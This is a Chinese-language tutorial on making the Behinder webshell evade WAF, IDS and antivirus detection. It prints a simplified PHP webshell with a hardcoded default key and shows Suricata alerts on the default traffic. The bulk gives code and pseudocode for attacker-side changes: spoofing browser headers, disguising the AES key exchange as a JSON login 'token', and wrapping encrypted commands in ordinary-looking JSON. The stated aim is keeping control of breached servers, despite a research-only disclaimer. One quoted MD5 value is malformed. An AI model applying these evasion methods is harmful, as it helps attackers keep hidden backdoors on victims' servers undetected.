> 本文档旨在深入研究Webshell的免杀技术，以知名Webshell管理工具“冰蝎”（Behinder）为例，剖析其数据特征与通信协议，并探索通过二次开发和修改绕过主流WAF（Web应用防火墙）、IDS（入侵检测系统）及杀毒软件（AV）的思路与方法。本文内容仅供技术研究和学习使用，严禁用于任何非法活动。

## 1. 概述

在网络安全攻防对抗中，Webshell的持久化与免杀能力是攻击方突破防御后维持控制权的关键。然而，随着各类安全产品检测能力的不断提升，传统的Webshell（如一句话木马）和知名的管理工具（如冰蝎、哥斯拉）的默认特征早已被各大安全厂商了如指掌。攻击流量一旦经过WAF、IDS等设备，其独特的通信模式和请求/响应载荷极易被识别并拦截。

为了应对这一挑战，免杀对抗技术应运而生。其核心思想可以归纳为以下三点：

1.  **Shell代码免杀**：通过加密、混淆、变形等手段，使Webshell后门文件本身能够绕过静态文件扫描，不被杀毒软件识别为恶意代码。
2.  **功能执行免杀**：修改Webshell的执行逻辑，使其在执行敏感操作（如命令执行、文件管理）时，能够规避动态行为检测和RASP（运行时应用自我保护）等技术的拦截。
3.  **通信流量免杀**：对Webshell客户端与服务端之间的通信协议进行深度定制和魔改，使其流量特征区别于原始工具，从而骗过网络层和应用层的流量检测设备。

本文将重点围绕第三点——**通信流量免杀**展开，以冰蝎为例，分析其默认协议的弱点，并提供具体的魔改思路与实战示例。

## 2. 技术原理：冰蝎的通信特征分析

冰蝎之所以被广泛应用，得益于其独特的动态密钥协商和加密通信机制。这使得其流量在早期具备较好的隐蔽性。然而，也正是这套固定的机制，成为了它被检测的关键特征。

### 2.1 冰蝎默认通信流程

冰蝎（以v3.0为例）的通信大致分为两个阶段：

1.  **密钥协商阶段**：
    *   客户端（攻击者）向服务端（Webshell）发起一个GET或POST请求。
    *   请求中不包含任何参数，或者包含一个随机长度的密码（在v3.0 beta 8之后，密码被硬编码在Shell中）。
    *   服务端接收到请求后，会生成一个16位的随机AES密钥，并将这个密钥存储在当前会话（Session）中。
    *   服务端将这个密钥的前16个字节作为响应体（Response Body）明文返回给客户端。
    *   客户端获取到这个密钥后，后续所有通信都将使用此密钥进行AES加密。

2.  **加密通信阶段**：
    *   客户端将需要执行的指令（如代码执行、文件操作等）构造成特定格式，然后使用协商好的AES密钥进行加密。
    *   加密后的数据作为POST请求的请求体发送给服务端。
    *   服务端接收到加密数据后，从Session中取出密钥进行解密，然后执行相应指令。
    *   执行结果同样使用该AES密钥加密，并作为响应体返回给客户端。
    *   客户端解密响应数据，得到最终结果。

### 2.2 可被检测的弱点特征

尽管流量内容是加密的，但其通信行为和元数据依然存在明显的“指纹”：

*   **固定的默认请求头**：冰蝎客户端在发起请求时，会使用一些相对固定的`User-Agent`、`Accept`等HTTP头。例如，早期版本的`User-Agent`可能包含`Java/1.8.0_121`等特征。
*   **响应体特征**：在密钥协商阶段，响应体是一个16字节的原始二进制数据，且`Content-Type`通常为`application/octet-stream`或`text/html`，这与正常Web应用返回HTML或JSON的行为模式差异巨大。
*   **无参数的协商请求**：密钥协商请求通常是一个不带任何参数的POST请求，这在实际Web应用中也较为少见。
*   **固定的密钥交换模式**：先进行一次看似“无意义”的请求，然后获取一个16字节的响应，紧接着后续所有请求都变成加密载荷。这种“握手->加密”的行为模式是IDS/NTA（网络流量分析）系统捕获冰蝎的核心依据。
*   **默认密码和代码结构**：冰蝎生成的默认PHP、JSP、ASPX等Shell文件，其代码结构和解密逻辑是固定的，容易被静态文件扫描引擎通过关键词（如`eval`、`assert`、`base64_decode`）和代码片段哈希匹配识别。

## 3. 环境准备

为了复现冰蝎的检测与后续的魔改验证，我们需要准备以下环境。

### 3.1 攻击与受害环境

*   **攻击机**：Kali Linux 或其他装有Java环境的系统，用于运行冰蝎客户端。
*   **靶机**：一台Web服务器（如LAMP/LNMP环境），用于放置Webshell。

### 3.2 流量监控与检测环境

我们使用开源IDS工具 **Suricata** 来监控和检测冰蝎的恶意流量。

1.  **安装Suricata**：
    在基于Debian/Ubuntu的系统上，安装非常简单。

    ```bash
    sudo apt update
    sudo apt install suricata -y
    ```

2.  **获取检测规则**：
    社区和安全厂商提供了大量针对恶意软件的Suricata规则。我们可以从以下来源获取针对Webshell的规则集：

    *   **Emerging Threats Open Ruleset**: 社区维护的免费规则集。
    *   **ptresearch/AttackDetection**: Positive Technologies团队的攻击检测规则。
    *   **al0ne/suricata-rules**: 个人维护的，包含针对冰蝎、哥斯拉等工具的规则。

    你可以通过`suricata-update`工具来管理和更新规则集，或者手动下载。

## 4. 实战示例：检测原始冰蝎流量

在开始魔改之前，我们先演示如何使用Suricata捕获未经修改的冰蝎v3.0流量。

### 4.1 部署Webshell

将冰蝎v3.0默认生成的`shell.php`文件上传到靶机的Web根目录。

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function E($D,$K){
    $T=array();
    for($i=0;$i<256;$i++){
        $T[$i]=$i;
    }
    $J=array();
    for($i=0;$i<256;$i++){
        $J[$i]=$K[@$i%strlen($K)];
    }
    for($i=0;$i<256;$i++){
        $y=($y+$T[$i]+ord($J[$i]))%256;
        $t=$T[$i];
        $T[$i]=$T[$y];
        $T[$y]=$t;
    }
    $t=null;
    $Z=array();
    for($i=0;$i<strlen($D);$i++){
        $a=($a+1)%256;
        $y=($y+$T[$a])%256;
        $t=$T[$a];
        $T[$a]=$T[$y];
        $T[$y]=$t;
        $Z[$i]=chr(ord($D[$i])^($T[($T[$a]+$T[$y])%256]));
    }
    return join('',$Z);
}
$K='e45e329feb5d925b'; // 默认密码的MD5前16位
$_SESSION['k']=$K;
$P=file_get_contents("php://input");
if(strlen($P)>0){
    print(E(E($P,$K),$K));
}
?>
```
> **注意**：以上为简化示例，实际冰蝎Shell会更复杂。此处的`$K`是默认密码`rebeyond`的MD5值`e45e329feb5d925b781f`的前16位。

### 4.2 启动Suricata监控

假设我们的靶机网卡为`eth0`，并且我们已经有了一套包含冰蝎检测规则的`behinder.rules`文件。

```bash
# 启动监控，-i 指定网卡，-S 指定规则文件
sudo suricata -c /etc/suricata/suricata.yaml -i eth0 -S behinder.rules
```

### 4.3 连接Webshell并观察日志

使用冰蝎客户端连接`http://<靶机IP>/shell.php`，密码为`rebeyond`。连接成功后，尝试执行一个命令，如`whoami`。

此时，查看Suricata的告警日志：

```bash
tail -f /var/log/suricata/fast.log
```

你很可能会看到类似以下的告警信息：

```log
[**] [1:2027505:2] ET WEB_SHELL Behinder Web Shell Initial Checkin [**] [Classification: Web Application Attack] [Priority: 1] {TCP} <攻击机IP>:<端口> -> <靶机IP>:80
[**] [1:2029218:1] ET WEB_SHELL Behinder 3.0 Webshell Command Execution Response [**] [Classification: A Network Trojan was Detected] [Priority: 1] {TCP} <靶机IP>:80 -> <攻击机IP>:<端口>
```

这证明了Suricata成功识别了冰蝎的密钥协商和命令执行流量。

## 5. 关键细节：魔改思路与实现

既然默认特征会被检测，我们的核心目标就是**消除这些固定特征**，让流量看起来更像正常的业务通信。

### 5.1 魔改一：修改HTTP请求/响应头

这是最基础也是最简单的修改。

*   **客户端修改**：
    反编译冰蝎客户端的JAR包，找到发起HTTP请求的相关代码。通常在`net.rebeyond.behinder.core.ShellService`类中。修改`User-Agent`、`Accept`、`Content-Type`等请求头，使其模拟成一个常见的浏览器或API客户端。

    ```java
    // 伪代码：修改前
    httpConn.setRequestProperty("User-Agent", "Java/1.8.0_121");

    // 伪代码：修改后
    httpConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
    httpConn.setRequestProperty("Accept", "application/json, text/plain, */*");
    ```

*   **服务端修改**：
    在Webshell脚本中，自定义响应头。例如，将`Content-Type`从`application/octet-stream`修改为`application/json`。

    ```php
    // PHP示例
    header("Content-Type: application/json; charset=utf-8");
    // ...后续代码...
    print($encrypted_data);
    ```

### 5.2 魔改二：重构密钥协商机制

这是绕过检测的关键一步。原始的“空请求 -> 16字节响应”模式必须被改变。

*   **思路**：将密钥隐藏在看似正常的业务数据中。例如，模拟一个JSON API的登录过程。

*   **新的通信流程**：
    1.  **客户端**：构造一个包含用户名和密码的JSON对象，并将其作为POST请求体发送。
        ```json
        {
          "username": "admin",
          "password": "some_random_string"
        }
        ```
    2.  **服务端**：
        *   接收到JSON数据，忽略`username`和`password`。
        *   生成一个16位的AES密钥。
        *   构造一个看似正常的成功登录响应JSON，将密钥巧妙地嵌入其中。例如，将密钥Base64编码后，伪装成一个`token`字段。
        ```php
        // 服务端PHP伪代码
        $key = openssl_random_pseudo_bytes(16); // 生成随机密钥
        $_SESSION['k'] = $key;

        $response = [
            "code" => 200,
            "message" => "Login successful",
            "data" => [
                "token" => base64_encode($key), // 将密钥伪装成token
                "expire" => time() + 3600
            ]
        ];

        header("Content-Type: application/json");
        echo json_encode($response);
        ```
    3.  **客户端**：
        *   反编译客户端代码，修改密钥获取逻辑。
        *   解析返回的JSON，提取`data.token`字段，进行Base64解码，得到真正的AES密钥。
        *   后续通信使用此密钥。

### 5.3 魔改三：改变加密数据的载荷形式

即使改变了密钥协商，如果后续请求的Body总是一长串无法解析的二进制数据，仍然可疑。

*   **思路**：将加密数据包装在常见的编码或数据结构中。

*   **实现**：
    1.  **客户端**：将AES加密后的数据进行Base64编码。然后将编码后的字符串放入一个JSON对象中。
        ```java
        // 伪代码
        byte[] encryptedPayload = AES.encrypt(payload, key);
        String base64Payload = Base64.getEncoder().encodeToString(encryptedPayload);
        String finalJson = "{\"payload\":\"" + base64Payload + "\"}";
        // 发送 finalJson
        ```
    2.  **服务端**：接收JSON，提取`payload`字段，进行Base64解码，再用AES解密。
        ```php
        // PHP伪代码
        $json_data = json_decode(file_get_contents("php://input"), true);
        $base64_payload = $json_data['payload'];
        $encrypted_payload = base64_decode($base64_payload);
        $decrypted_payload = AES::decrypt($encrypted_payload, $_SESSION['k']);
        // 执行 $decrypted_payload
        ```

    通过这种方式，所有通信流量在表面上看起来都是合法的JSON API交互，大大降低了被检测的风险。

## 6. 安全总结

通过对冰蝎的通信协议进行二次开发和魔改，我们可以有效地绕过基于固定特征的检测工具。本次学习笔记的核心要点可以总结如下：

*   **没有绝对安全的工具，只有不断变化的对抗**：任何具有固定特征的工具，无论其加密多强，都难逃被指纹识别的命运。免杀的本质是“差异化”，即让自己的工具和行为区别于已知的恶意模式。
*   **流量伪装是关键**：将恶意通信伪装成正常业务流量是高级Webshell对抗的核心思想。这要求攻击者不仅要懂安全，还要懂Web开发，了解正常的API是如何设计和交互的。
*   **攻防一体，换位思考**：理解检测工具（如Suricata）的原理，才能更精准地找到绕过方法。规则是死的，但攻击者的思路是活的。从防御者的视角审视自己的工具，才能发现其弱点。

本文仅探讨了冰蝎通信协议改造的上半部分，后续还可以从**代码执行方式**（如使用`register_shutdown_function`、`array_map`等更隐蔽的函数）、**Shell代码混淆**、**反内存马查杀**等角度进行更深入的魔改。网络安全的学习之路，就是一场永不停止的攻防演练。

---
